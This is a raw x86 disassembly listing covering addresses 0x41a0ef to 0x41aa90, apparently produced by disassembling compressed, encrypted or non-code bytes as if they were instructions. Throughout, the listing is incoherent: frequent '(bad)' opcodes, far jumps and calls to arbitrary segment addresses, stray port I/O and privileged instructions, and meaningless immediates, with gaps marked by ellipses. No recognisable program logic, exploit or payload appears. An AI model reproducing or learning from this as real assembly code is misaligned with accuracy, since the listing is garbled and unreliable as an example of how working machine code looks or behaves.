  41a0ef:	std    
  41a0f0:	adc    al,0x8d
  41a0f2:	mov    esi,0x686b0794
  41a0f7:	push   cs
  41a0f8:	(bad)  
  41a0f9:	scas   eax,DWORD PTR es:[edi]
  41a0fa:	jl     0x41a0ed
  41a0fc:	inc    ebp
  41a0fd:	dec    ebp
  41a0fe:	mov    ebp,0x7c69ec3
  41a103:	js     0x41a137
  41a105:	out    dx,al
  41a106:	fmul   DWORD PTR [edi]
  41a108:	aam    0xdd
  41a10a:	imul   edx,DWORD PTR [esi],0x2de85deb
  41a110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a111:	xor    al,0x78
  41a113:	push   esp
  41a114:	lock cmp BYTE PTR [edi-0x7a],cl
  41a118:	cli    
  41a119:	or     eax,0x8936cd56
  41a11e:	xor    DWORD PTR [eax-0x64],esp
  41a121:	jle    0x41a183
  41a123:	js     0x41a120
  41a125:	fs mov bh,0xfe
  41a128:	inc    edx
  41a129:	ds xor eax,0x4bc531ae
  41a12f:	and    DWORD PTR [ebp+eax*1+0x5e5fe2bc],0x641ac8c
  41a13a:	xchg   ebx,eax
  41a13b:	daa    
  41a13c:	cmp    edx,DWORD PTR [ebx+edx*1]
  41a13f:	jmp    0x66a9:0x8ebfa25d
  41a146:	and    BYTE PTR [edx+0x3a],dl
  41a149:	cmp    DWORD PTR [ebx-0x6bed258],ecx
  41a14f:	push   es
  41a150:	fwait
  41a151:	mov    cl,BYTE PTR [edi-0x42fcfab1]
  41a157:	sub    al,BYTE PTR [esi+0x52]
  41a15a:	adc    DWORD PTR [edx],edi
  41a15c:	xchg   edx,eax
  41a15d:	mov    dh,BYTE PTR [ebp+0x61f40ce7]
  41a163:	inc    ecx
  41a164:	or     al,0xc9
  41a166:	jns    0x41a1bd
  41a168:	push   es
  41a169:	bound  edi,QWORD PTR [esp+ebp*4+0x62]
  41a16d:	ret    
  41a16e:	mov    BYTE PTR [edx],bh
  41a170:	sbb    al,0xa9
  41a172:	sub    BYTE PTR [ebp-0xc361486],0xeb
  41a179:	call   0x3ef31d61
  41a17e:	gs jbe 0x41a1ed
  41a181:	dec    ebx
  41a182:	sub    BYTE PTR [edi],dh
  41a184:	or     DWORD PTR es:[ebx-0x6064342a],ebx
  41a18b:	mov    esi,0x2f4cf804
  41a190:	rol    BYTE PTR [eax],0x0
	...
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	inc    edi
  41a201:	dec    edx
  41a202:	pop    es
  41a203:	mov    esp,DWORD PTR [esi]
  41a205:	adc    eax,0x1050001
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	push   ebp
  41a20d:	ss pop ecx
  41a20f:	imul   esi,DWORD PTR [edi-0x2b],0xffffff83
  41a213:	pop    ebx
  41a214:	ret    0x3185
  41a217:	sbb    al,0x6a
  41a219:	test   BYTE PTR [ebp-0x5c],bl
  41a21c:	cs (bad) 
  41a21e:	mov    DWORD PTR [edi+0x24],ecx
  41a221:	push   0x68bad2e2
  41a226:	in     eax,0xd6
  41a228:	rcl    dh,cl
  41a22a:	dec    ebp
  41a22b:	jmp    0xf488:0x472a0241
  41a232:	out    0xf6,al
  41a234:	jns    0x41a206
  41a236:	fwait
  41a237:	push   ss
  41a238:	and    ebx,DWORD PTR [edx+0x48]
  41a23b:	or     al,0x8a
  41a23d:	dec    ebx
  41a23e:	test   eax,0xb734606e
  41a243:	cli    
  41a244:	(bad)  
  41a245:	pop    ds
  41a246:	adc    edx,DWORD PTR [eax-0x30]
  41a249:	mov    ch,0x24
  41a24b:	in     al,0xcc
  41a24d:	call   0x87a9:0xb999457c
  41a254:	std    
  41a255:	and    eax,edi
  41a257:	cmp    BYTE PTR [edi-0xb],al
  41a25a:	pop    es
  41a25b:	sti    
  41a25c:	pop    esi
  41a25d:	mov    ebx,0x4e4a64f1
  41a262:	outs   dx,BYTE PTR ds:[esi]
  41a263:	or     DWORD PTR [ebp+0x3e72c396],eax
  41a269:	ins    BYTE PTR es:[edi],dx
  41a26a:	mov    bl,0x1f
  41a26c:	cli    
  41a26d:	push   ecx
  41a26e:	jbe    0x41a2b4
  41a270:	test   BYTE PTR [ebx],al
  41a272:	(bad)  
  41a273:	xor    DWORD PTR [ebp+0x6c],eax
  41a276:	dec    ebx
  41a277:	fwait
  41a278:	pop    ecx
  41a279:	push   edx
  41a27a:	sbb    ah,cl
  41a27c:	stos   BYTE PTR es:[edi],al
  41a27d:	sbb    BYTE PTR [ebx],al
  41a27f:	ss ret 0x6ddc
  41a283:	ins    DWORD PTR es:[edi],dx
  41a284:	mov    ch,0x44
  41a286:	hlt    
  41a287:	mov    dh,bh
  41a289:	leave  
  41a28a:	push   0xfffffff2
  41a28c:	aaa    
  41a28d:	jmp    0xc555:0x52b2fe2b
  41a294:	inc    ebp
  41a295:	add    cl,dl
  41a297:	out    0x14,al
  41a299:	daa    
  41a29a:	sub    al,0x57
  41a29c:	es ret 0x8111
  41a2a0:	dec    edi
  41a2a1:	jbe    0x41a254
  41a2a3:	dec    eax
  41a2a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2a5:	sub    al,bh
  41a2a7:	in     eax,0x21
  41a2a9:	jmp    0x41a2ff
  41a2ab:	mul    DWORD PTR [ecx]
  41a2ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ae:	out    0xe3,eax
  41a2b0:	dec    ecx
  41a2b1:	sbb    al,0x17
  41a2b3:	mov    DWORD PTR [esi-0x40bca8d4],ebp
  41a2b9:	mov    cl,0x9c
  41a2bb:	xor    BYTE PTR [ebp+0x40],dl
  41a2be:	or     esp,ebx
  41a2c0:	push   es
  41a2c1:	pusha  
  41a2c2:	sbb    ebp,esi
  41a2c4:	fwait
  41a2c5:	dec    esp
  41a2c6:	aas    
  41a2c7:	and    DWORD PTR [ebx-0x69],edx
  41a2ca:	out    0xb8,al
  41a2cc:	lds    ecx,FWORD PTR [eax+0xe9000fc]
  41a2d2:	fcomp  QWORD PTR [edx-0x42]
  41a2d5:	ret    
  41a2d6:	add    dh,BYTE PTR [ebp+0x63]
  41a2d9:	les    eax,FWORD PTR [edi+0x5c]
  41a2dc:	xchg   esp,eax
  41a2dd:	popf   
  41a2de:	sub    dl,BYTE PTR [esi*4+0x54aabd4f]
  41a2e5:	xor    DWORD PTR [esi-0x63],0x33
  41a2e9:	jge    0x41a29a
  41a2eb:	adc    DWORD PTR [ecx-0x7f],esi
  41a2ee:	int    0xb7
  41a2f0:	push   ds
  41a2f1:	sbb    DWORD PTR [edi-0x2dd4be0d],ebp
  41a2f7:	jle    0x41a33f
  41a2f9:	pop    ebx
  41a2fa:	call   FWORD PTR [edi+0x6d]
  41a2fd:	xchg   dl,cl
  41a2ff:	into   
  41a300:	test   ebx,0xd21dc55f
  41a306:	popa   
  41a307:	lods   al,BYTE PTR ds:[esi]
  41a308:	xchg   edi,eax
  41a309:	jecxz  0x41a311
  41a30b:	xor    DWORD PTR [esi],edi
  41a30d:	ins    BYTE PTR es:[edi],dx
  41a30e:	xor    BYTE PTR [ecx+0x2],dl
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	(bad)  [eax+0x62]
  41a383:	adc    ebp,DWORD PTR [ebx]
  41a385:	push   ss
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0x7c000001
  41a38d:	mov    al,ah
  41a38f:	sub    bl,BYTE PTR [ebx+esi*8+0x1a]
  41a393:	mov    ecx,0x5fa502bf
  41a398:	push   ebp
  41a39a:	inc    dx
  41a39c:	sub    al,0x5f
  41a39e:	sbb    DWORD PTR ds:[ebx+0x5606c426],esp
  41a3a5:	add    al,BYTE PTR [edx]
  41a3a7:	mov    bl,0x3c
  41a3a9:	push   ebx
  41a3aa:	push   ebx
  41a3ab:	cli    
  41a3ac:	(bad)  
  41a3ad:	iret   
  41a3ae:	add    BYTE PTR ds:0xfcd26b4b,dh
  41a3b4:	scas   eax,DWORD PTR es:[edi]
  41a3b5:	adc    ah,bl
  41a3b7:	pop    es
  41a3b8:	sub    eax,0x9034b719
  41a3bd:	or     DWORD PTR [edx-0x77958751],ecx
  41a3c3:	add    DWORD PTR [edi+0x2464a751],ebp
  41a3c9:	cmp    eax,0x491d49aa
  41a3ce:	imul   eax,ebx,0xe43922c1
  41a3d4:	sbb    BYTE PTR [esp+ebp*1-0x3eaafb8],0x9d
  41a3dc:	push   eax
  41a3dd:	mov    esi,ds
  41a3df:	ret    0xb00b
  41a3e2:	fwait
  41a3e3:	inc    DWORD PTR [edx+0x6e]
  41a3e6:	retf   0x38cf
  41a3e9:	jmp    0xbe272f3e
  41a3ee:	div    DWORD PTR [edx-0x74]
  41a3f1:	jns    0x41a3a8
  41a3f3:	xor    DWORD PTR ds:0xafea9589,ecx
  41a3f9:	xor    ebx,DWORD PTR [ebx+0x30]
  41a3fc:	popf   
  41a3fd:	dec    edx
  41a3fe:	fs push es
  41a400:	sub    eax,0x38db232d
  41a405:	fsubp  st(4),st
  41a407:	into   
  41a408:	adc    al,0x56
  41a40a:	ins    BYTE PTR es:[edi],dx
  41a40b:	fs jb  0x41a3ff
  41a40e:	adc    esp,esi
  41a410:	adc    ebx,DWORD PTR [edi]
  41a412:	adc    BYTE PTR [edi+eiz*8],ch
  41a415:	test   al,0xee
  41a417:	cmc    
  41a418:	push   esi
  41a419:	add    DWORD PTR [ecx+0x4b33bf4c],0x48321d4f
  41a423:	sbb    al,0x1a
  41a425:	test   esi,ebp
  41a427:	popa   
  41a428:	jl     0x41a47b
  41a42a:	xor    eax,0xcc0b256c
  41a42f:	push   eax
  41a430:	lock xlat BYTE PTR ds:[ebx]
  41a432:	jnp    0x41a4a5
  41a434:	inc    ecx
  41a435:	sub    BYTE PTR ds:0x936792a2,dh
  41a43b:	sti    
  41a43c:	xchg   edi,eax
  41a43d:	retw   0xe9bd
  41a441:	push   cs
  41a442:	xchg   esp,eax
  41a443:	xchg   DWORD PTR [eax-0xe],edi
  41a446:	xchg   ebp,eax
  41a447:	sub    DWORD PTR [edi],edx
  41a449:	or     eax,0xcf06232f
  41a44e:	xchg   esi,eax
  41a44f:	jb     0x41a3ea
  41a451:	or     DWORD PTR [eax-0x713b5bd2],eax
  41a457:	stos   BYTE PTR es:[edi],al
  41a458:	arpl   WORD PTR [esi],si
  41a45a:	and    eax,0x8d127c4b
  41a45f:	jmp    0x95701e55
  41a464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a465:	(bad)  
  41a466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a467:	push   esi
  41a468:	ins    DWORD PTR es:[edi],dx
  41a469:	adc    BYTE PTR [edx],0xb2
  41a46c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a46d:	jne    0x41a44b
  41a46f:	push   0x1a
  41a471:	mov    dl,0x11
  41a473:	jno    0x41a4e5
  41a475:	push   0x65
  41a477:	pushf  
  41a478:	mov    ecx,0xd78f27b0
  41a47d:	shl    BYTE PTR [edi+0x10287944],0xe4
  41a484:	mov    dh,0x81
  41a486:	pop    edi
  41a487:	pop    esi
  41a488:	ins    DWORD PTR es:[edi],dx
  41a489:	jae    0x41a48f
  41a48b:	jmp    0xc2:0xce3edf90
	...
  41a4f2:	add    BYTE PTR [eax],al
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	arpl   WORD PTR [ecx+edx*2],bx
  41a503:	scas   eax,DWORD PTR es:[edi]
  41a504:	xor    BYTE PTR [edi],dl
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0xc4000001
  41a50d:	popa   
  41a50e:	ret    
  41a50f:	pop    esp
  41a510:	lods   al,BYTE PTR ds:[esi]
  41a511:	aad    0x87
  41a513:	inc    edi
  41a514:	push   ebx
  41a515:	ret    
  41a516:	sbb    BYTE PTR [ebp+0x60],dl
  41a519:	dec    esi
  41a51a:	sar    DWORD PTR [ecx],0x7a
  41a51d:	inc    DWORD PTR [esi]
  41a51f:	push   esi
  41a521:	mov    ebp,0xacf9f9ac
  41a526:	out    dx,al
  41a527:	inc    esp
  41a528:	pop    esp
  41a529:	mov    bl,0x6b
  41a52b:	call   0xeb7c1076
  41a530:	sub    bh,dh
  41a532:	add    esi,DWORD PTR [edx-0x3a]
  41a535:	test   ah,0x66
  41a538:	jo     0x41a4bf
  41a53a:	aaa    
  41a53b:	mov    bl,0xbb
  41a53d:	adc    al,0xe
  41a53f:	mov    ebp,0xfb508796
  41a544:	and    BYTE PTR [ebp+0x3c],dl
  41a547:	sahf   
  41a548:	pop    ebp
  41a549:	xor    ebx,ecx
  41a54b:	mov    al,0x7b
  41a54d:	push   cs
  41a54e:	imul   esp,DWORD PTR [ebx],0xa2129cb9
  41a554:	add    dh,BYTE PTR [edi-0x1d]
  41a557:	fnsave [edi+0x1b]
  41a55a:	arpl   WORD PTR [ebx*8-0x6accd650],sp
  41a561:	das    
  41a562:	xor    BYTE PTR [eax+0x157dab74],bl
  41a568:	push   ecx
  41a569:	xchg   BYTE PTR [eax],cl
  41a56b:	dec    esp
  41a56c:	jl     0x41a5d5
  41a56e:	shl    DWORD PTR [esi+0x2bbdbcbf],0x9b
  41a575:	inc    ebp
  41a576:	retf   0xe70e
  41a579:	jmp    0x584f:0xf14fed23
  41a580:	scas   eax,DWORD PTR es:[edi]
  41a581:	jg     0x41a5a5
  41a583:	sbb    eax,ebp
  41a585:	or     DWORD PTR [esi+0x43dcdef5],edi
  41a58b:	loopne 0x41a5ef
  41a58d:	sub    DWORD PTR [esi-0x26],0x40a8d571
  41a594:	inc    edi
  41a595:	dec    edi
  41a596:	pop    edx
  41a597:	sub    BYTE PTR [ebx-0x37a4d953],cl
  41a59d:	sti    
  41a59e:	add    eax,0xeb78665c
  41a5a3:	mov    WORD PTR [ebx-0x16b26871],ds
  41a5a9:	lea    edx,[ebp+eax*2+0x45]
  41a5ad:	outs   dx,DWORD PTR ds:[esi]
  41a5ae:	leave  
  41a5af:	fidivr DWORD PTR [ecx-0x30568111]
  41a5b5:	int    0xdc
  41a5b7:	into   
  41a5b8:	mov    cl,0xd8
  41a5ba:	ins    DWORD PTR es:[edi],dx
  41a5bb:	sub    BYTE PTR ds:0x9e783c62,ch
  41a5c1:	sbb    al,0x15
  41a5c3:	int3   
  41a5c4:	jbe    0x41a5f1
  41a5c6:	mov    eax,0xf3f11815
  41a5cb:	adc    al,0x1f
  41a5cd:	sub    ah,BYTE PTR [ecx-0x77]
  41a5d0:	sub    esi,ebp
  41a5d2:	data16 test BYTE PTR [bx+di+0x1069],al
  41a5d8:	dec    ecx
  41a5d9:	xchg   esp,eax
  41a5da:	int    0x34
  41a5dc:	dec    edx
  41a5dd:	cmp    DWORD PTR [edx-0x42538883],edx
  41a5e3:	gs cmp bl,bh
  41a5e6:	(bad)  
  41a5e7:	mov    edi,0x6fc95fb9
  41a5ec:	cwde   
  41a5ed:	daa    
  41a5ee:	js     0x41a65c
  41a5f0:	pushf  
  41a5f1:	cwde   
  41a5f2:	call   0x90cf43d6
  41a5f7:	ret    
  41a5f8:	fdivr  st(3),st
  41a5fa:	pop    eax
  41a5fb:	dec    ebp
  41a5fc:	cs adc al,0x61
  41a5ff:	or     al,0x30
  41a601:	scas   eax,DWORD PTR es:[edi]
  41a602:	std    
  41a603:	(bad)  
  41a604:	int    0x72
  41a606:	and    edi,ebx
  41a608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a609:	loopne 0x41a667
  41a60b:	clc    
  41a60c:	or     esp,ebx
  41a60e:	loope  0x41a68d
  41a610:	jmp    0x41a612
	...
  41a672:	add    BYTE PTR [eax],al
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x7165a625
  41a682:	frstor [ecx+0x11835]
  41a688:	add    eax,0x2f000001
  41a68d:	idiv   cl
  41a68f:	push   ecx
  41a690:	test   DWORD PTR [eax],0xd4f7163e
  41a696:	xchg   esi,eax
  41a697:	ss in  al,dx
  41a699:	mov    esi,0x982b582
  41a69e:	imul   edx,eax,0x5
  41a6a1:	xchg   esp,eax
  41a6a2:	cli    
  41a6a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6a4:	sub    BYTE PTR [ebx+0x70],ah
  41a6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6a8:	pop    edi
  41a6a9:	imul   ebx,DWORD PTR [ebp-0x4520d101],0xffffffd7
  41a6b0:	loop   0x41a70c
  41a6b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6b3:	retf   0x85e1
  41a6b6:	pop    esi
  41a6b7:	pop    ss
  41a6b8:	jmp    DWORD PTR [edi+eax*1-0x78dcd890]
  41a6bf:	xor    ecx,eax
  41a6c1:	xchg   esp,eax
  41a6c2:	mov    bh,0xe5
  41a6c4:	lods   eax,DWORD PTR ds:[esi]
  41a6c5:	jnp    0x41a64f
  41a6c7:	(bad)  
  41a6c8:	lods   eax,DWORD PTR ds:[esi]
  41a6c9:	arpl   WORD PTR [ebx+0x6],bp
  41a6cc:	dec    edi
  41a6cd:	jle    0x41a715
  41a6cf:	jg     0x41a731
  41a6d1:	mov    dh,0x53
  41a6d3:	call   0x5406fad6
  41a6d8:	or     al,0xd5
  41a6da:	test   BYTE PTR [edx+0x4ac36b5e],dh
  41a6e0:	call   FWORD PTR ds:0x510daa0c
  41a6e6:	imul   dl
  41a6e8:	inc    eax
  41a6e9:	adc    eax,DWORD PTR [ebx-0x78]
  41a6ec:	arpl   ax,ax
  41a6ee:	jmp    0x4284:0x5705046
  41a6f5:	adc    dh,BYTE PTR [esi-0x2ac21b62]
  41a6fb:	pop    ebx
  41a6fc:	xchg   edi,eax
  41a6fd:	cdq    
  41a6fe:	(bad)  
  41a6ff:	xchg   ebp,eax
  41a700:	or     BYTE PTR [ebp-0x210be23f],ch
  41a706:	popa   
  41a707:	outs   dx,BYTE PTR ds:[esi]
  41a708:	clc    
  41a709:	hlt    
  41a70a:	or     eax,0x24bc8d3c
  41a70f:	(bad)  
  41a710:	xlat   BYTE PTR ds:[ebx]
  41a711:	xchg   dx,ax
  41a713:	data16 jmp 0x41a6d0
  41a716:	(bad)  
  41a717:	loopne 0x41a771
  41a719:	sbb    al,0xae
  41a71b:	adc    ebx,eax
  41a71d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a71e:	sbb    ebx,DWORD PTR [ebx-0x59363023]
  41a724:	rol    BYTE PTR [edx-0x6e],0xfd
  41a728:	jecxz  0x41a6cd
  41a72a:	xor    bh,BYTE PTR [ecx+0x394a8c3f]
  41a730:	ja     0x41a780
  41a732:	aad    0x62
  41a734:	or     BYTE PTR [eax+0x41],dl
  41a737:	inc    ebp
  41a738:	dec    ebx
  41a739:	lahf   
  41a73a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a73b:	hlt    
  41a73c:	mov    ch,0xef
  41a73e:	inc    esi
  41a73f:	cmp    dl,BYTE PTR [edi+0x5f]
  41a742:	lea    esp,[ecx+0x40]
  41a745:	imul   esp,DWORD PTR [ebx-0x77],0x7c4b7ecc
  41a74c:	mov    esp,0xa381d29a
  41a751:	out    dx,eax
  41a752:	pop    esi
  41a753:	lods   eax,DWORD PTR ds:[esi]
  41a754:	xchg   esp,eax
  41a755:	cmp    al,0x5d
  41a757:	or     BYTE PTR [edx+0x25],0xff
  41a75b:	or     dh,0x7d
  41a75e:	cld    
  41a75f:	jae    0x41a7d6
  41a761:	inc    BYTE PTR [ecx]
  41a763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a764:	sub    eax,0xdb05acd0
  41a769:	adc    al,0x65
  41a76b:	mov    ds:0xf7b290d6,eax
  41a770:	loop   0x41a757
  41a772:	imul   esi,DWORD PTR [eax-0x66],0xea0fd030
  41a779:	cmc    
  41a77a:	sub    al,0xa
  41a77c:	aad    0x88
  41a77e:	pop    edi
  41a77f:	pop    ds
  41a780:	mov    eax,ds:0x58dcfdd
  41a785:	push   0xfffffffd
  41a787:	pop    es
  41a788:	pusha  
  41a789:	test   eax,0xdb6be99e
  41a78e:	push   edi
  41a78f:	arpl   WORD PTR [edx+0x0],dx
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x415327ca,al
  41a801:	in     al,dx
  41a802:	and    edi,esp
  41a804:	cmp    bl,BYTE PTR [ecx]
  41a806:	add    DWORD PTR [eax],eax
  41a808:	add    eax,0x84000001
  41a80d:	jmp    FWORD PTR [esi]
  41a80f:	iret   
  41a810:	add    BYTE PTR [edx],ah
  41a812:	cmp    BYTE PTR [eax+0x4d],ch
  41a815:	test   al,0xb4
  41a817:	or     DWORD PTR [ecx+ebx*8-0x27],eax
  41a81b:	mov    esi,0x2711e6e9
  41a820:	mov    DWORD PTR [edx],0x197f2096
  41a826:	adc    dh,bh
  41a828:	pop    ecx
  41a829:	sbb    eax,0x17e53083
  41a82e:	jmp    0xa9fd:0x3135ec2d
  41a835:	sub    cl,BYTE PTR [edx+esi*8]
  41a838:	inc    ebp
  41a839:	push   ebx
  41a83a:	push   ebx
  41a83b:	xchg   ebp,eax
  41a83c:	mov    ds:0x6c531a11,eax
  41a841:	mov    dl,0xfa
  41a843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a844:	clc    
  41a845:	push   ecx
  41a846:	pop    edx
  41a847:	push   esp
  41a848:	jmp    0xeeef6f37
  41a84d:	mov    ah,0x6a
  41a84f:	jb     0x41a8c6
  41a851:	cmp    al,bl
  41a853:	ins    DWORD PTR es:[edi],dx
  41a854:	push   cs
  41a855:	pushf  
  41a856:	addr16 inc ecx
  41a858:	rol    BYTE PTR [edi-0x5edfc47e],1
  41a85e:	mov    eax,ds:0x6a855446
  41a863:	ss lahf 
  41a865:	or     dl,bl
  41a867:	fs sub bl,ah
  41a86a:	sub    esp,eax
  41a86c:	jg     0x41a8bc
  41a86e:	mov    esp,0xbba5e474
  41a873:	(bad)  
  41a874:	adc    DWORD PTR [edx],eax
  41a876:	adc    eax,0x1ccff2ef
  41a87b:	pop    eax
  41a87c:	retf   0x45d6
  41a87f:	cs add bl,bl
  41a882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a883:	dec    edx
  41a884:	daa    
  41a885:	jmp    0x7fda:0x98586e7b
  41a88c:	sub    cl,BYTE PTR [ebp+ebp*1-0x576ebc1f]
  41a893:	mov    DWORD PTR [esi-0x298dcc20],ebx
  41a899:	push   cs
  41a89a:	retf   0xd9c7
  41a89d:	daa    
  41a89e:	inc    ecx
  41a89f:	pop    ebx
  41a8a0:	in     al,0x2c
  41a8a2:	rcr    DWORD PTR [ebx-0x63],cl
  41a8a5:	(bad)  
  41a8a6:	and    DWORD PTR [eax],edi
  41a8a8:	icebp  
  41a8a9:	mov    BYTE PTR [ecx-0x1bc4b387],cl
  41a8af:	and    eax,0x31f732e2
  41a8b4:	mov    ch,0x5d
  41a8b6:	mov    DWORD PTR [ebx],0x18605df3
  41a8bc:	(bad)  
  41a8bd:	mov    DWORD PTR [ecx+0x5c],0x3c4e1a46
  41a8c4:	xchg   ebp,eax
  41a8c5:	xor    eax,DWORD PTR [ebx-0x3d]
  41a8c8:	add    BYTE PTR [esi],dh
  41a8ca:	mov    edi,0x19e5b47f
  41a8cf:	cmc    
  41a8d0:	test   eax,0xeee65542
  41a8d5:	mov    al,ds:0x705dda8
  41a8da:	popa   
  41a8db:	sbb    al,0x71
  41a8dd:	push   ds
  41a8de:	sti    
  41a8df:	cmp    cl,dl
  41a8e1:	lea    esi,[ebx]
  41a8e3:	adc    al,0xd6
  41a8e5:	test   eax,0x729f1602
  41a8ea:	fwait
  41a8eb:	lea    edx,[ecx+0x70]
  41a8ee:	and    dl,BYTE PTR [edi]
  41a8f0:	ja     0x41a88b
  41a8f2:	dec    edx
  41a8f3:	or     al,0xfb
  41a8f5:	imul   BYTE PTR [ebp+ebx*8+0x27165599]
  41a8fc:	jns    0x41a948
  41a8fe:	js     0x41a901
  41a900:	cmp    BYTE PTR [ecx+edi*8-0x4c],al
  41a904:	jle    0x41a8f8
  41a906:	leave  
  41a907:	push   esi
  41a908:	dec    ecx
  41a909:	popf   
  41a90a:	sub    DWORD PTR fs:[eax+0x3a],ebp
  41a90e:	imul   edi,DWORD PTR [edi],0xc5
	...
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	inc    edx
  41a981:	dec    esp
  41a982:	and    al,0xf9
  41a984:	aas    
  41a985:	sbb    al,BYTE PTR [ecx]
  41a987:	add    BYTE PTR ds:0x83000001,al
  41a98d:	shl    esi,cl
  41a98f:	cmp    eax,0x9b6ee5e8
  41a994:	imul   ebp,DWORD PTR [edx],0x43621dbf
  41a99a:	adc    ebp,DWORD PTR [edi+eiz*1+0x7fd5a496]
  41a9a1:	repz and esi,DWORD PTR [ebp+0x4d2a1812]
  41a9a8:	sub    cl,bl
  41a9aa:	mov    cl,0x4c
  41a9ac:	ds adc eax,0xd198e884
  41a9b2:	pusha  
  41a9b3:	and    al,0xc2
  41a9b5:	sbb    ch,BYTE PTR [eax+ebx*1-0x51c50fea]
  41a9bc:	jg     0x41a955
  41a9be:	mov    dl,0x10
  41a9c0:	call   0x4293:0xcaa0ccb5
  41a9c7:	cdq    
  41a9c8:	lahf   
  41a9c9:	sbb    al,0x2
  41a9cb:	shr    BYTE PTR [edx+0xb],0x55
  41a9cf:	lods   al,BYTE PTR ds:[esi]
  41a9d0:	cmp    eax,0xb4972dfa
  41a9d5:	push   ebx
  41a9d6:	fst    QWORD PTR [ebx-0x38]
  41a9d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9da:	mov    dl,0x5c
  41a9dc:	or     ah,BYTE PTR [edi]
  41a9de:	(bad)  
  41a9df:	sub    eax,0xc314f42d
  41a9e4:	repz pop ebx
  41a9e6:	pop    eax
  41a9e7:	push   ebp
  41a9e8:	cs stos BYTE PTR es:[edi],al
  41a9ea:	stc    
  41a9eb:	ins    BYTE PTR es:[edi],dx
  41a9ec:	pop    ebp
  41a9ed:	jge    0x41aa60
  41a9ef:	pop    ds
  41a9f0:	mov    ds:0xacfbcf00,al
  41a9f5:	inc    edi
  41a9f6:	inc    ebx
  41a9f7:	gs inc eax
  41a9f9:	sahf   
  41a9fa:	scas   eax,DWORD PTR es:[edi]
  41a9fb:	sub    ebx,DWORD PTR [ebp+eax*4-0x71ae7c1f]
  41aa02:	es stos DWORD PTR es:[edi],eax
  41aa04:	xor    al,0x48
  41aa06:	in     eax,0x7d
  41aa08:	push   esp
  41aa09:	js     0x41aa29
  41aa0b:	leave  
  41aa0c:	mov    ds:0xb6d28666,al
  41aa11:	mov    ds:0xbb4a018,eax
  41aa16:	repnz in al,0x79
  41aa19:	clc    
  41aa1a:	clc    
  41aa1b:	test   eax,0x4975f682
  41aa20:	adc    bh,BYTE PTR [edi-0x44]
  41aa23:	sub    BYTE PTR [ecx],0xf3
  41aa26:	sub    al,0x95
  41aa28:	aam    0x81
  41aa2a:	add    dl,BYTE PTR [edx]
  41aa2c:	pop    ebx
  41aa2d:	out    dx,al
  41aa2e:	push   cs
  41aa2f:	mov    esp,DWORD PTR [edi+0x6bd9a12d]
  41aa35:	cmp    al,BYTE PTR [eax-0x35bf476a]
  41aa3b:	shl    BYTE PTR [ebx+0x7cac12a6],0x78
  41aa42:	mov    dh,0xb8
  41aa44:	test   al,0xc8
  41aa46:	cmp    BYTE PTR [ebx],ch
  41aa48:	xlat   BYTE PTR ds:[ebx]
  41aa49:	pop    edx
  41aa4a:	cmp    BYTE PTR [esi+0x5abc6a5],dh
  41aa50:	add    BYTE PTR ds:0xd62ef4fe,dl
  41aa56:	inc    ecx
  41aa57:	shr    DWORD PTR [edi],cl
  41aa59:	xchg   ebp,eax
  41aa5a:	shl    bh,0xaa
  41aa5d:	jmp    0x41aa2e
  41aa5f:	mov    bh,BYTE PTR [ecx-0x2d]
  41aa62:	pop    esp
  41aa63:	mov    edx,DWORD PTR [eax]
  41aa65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa66:	pop    ebx
  41aa67:	movnti DWORD PTR [ebx],eax
  41aa6a:	arpl   WORD PTR [edx+0x19c0a84c],bp
  41aa70:	sub    dh,BYTE PTR [eax]
  41aa72:	mov    esp,0x29d7b14e
  41aa77:	and    edx,DWORD PTR [edx]
  41aa79:	cmp    eax,0xb8753f84
  41aa7e:	or     ah,bh
  41aa80:	iret   
  41aa81:	or     BYTE PTR [eax+0x5b],dh
  41aa84:	(bad)  
  41aa85:	out    dx,al
  41aa86:	(bad)  
  41aa87:	xchg   edx,eax
  41aa88:	dec    esi
  41aa89:	xlat   BYTE PTR ds:[ebx]
  41aa8a:	mov    edx,0x647d8f19
  41aa8f:	push   ebp
  41aa90:	aaa    
	...
